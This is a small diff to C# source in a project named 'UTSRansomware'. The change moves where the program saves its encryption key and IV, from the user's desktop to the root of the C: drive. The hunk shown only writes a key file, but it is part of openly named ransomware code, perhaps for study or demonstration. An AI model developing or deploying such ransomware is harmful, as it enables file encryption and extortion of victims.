@@ -123,8 +123,7 @@ namespace UTSRansomware
 
         private void SaveKeyAndIvToDesktop()
         {
-            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            string fileName = Path.Combine(desktopPath, "key_iv.txt");
+            string fileName = Path.Combine(@"C:\", "key_iv.txt");
 
             // Convert key and IV to Base64 strings
             string keyAsString = Convert.ToBase64String(this.key);
